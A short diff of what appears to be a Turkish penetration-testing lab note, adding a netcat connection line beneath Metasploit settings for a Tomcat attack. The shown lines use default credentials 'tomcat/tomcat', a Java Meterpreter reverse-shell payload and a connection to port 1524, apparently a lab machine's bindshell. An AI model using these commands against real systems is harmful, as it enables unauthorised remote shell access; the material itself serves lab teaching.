@@ -29,6 +29,7 @@ set username tomcat
 set password tomcat
 set payload java/meterpreter/reverse_tcp
 set lhost 10.0.3.5
+nc 10.0.3.7 1524
 ```
 
 ## Ödevler
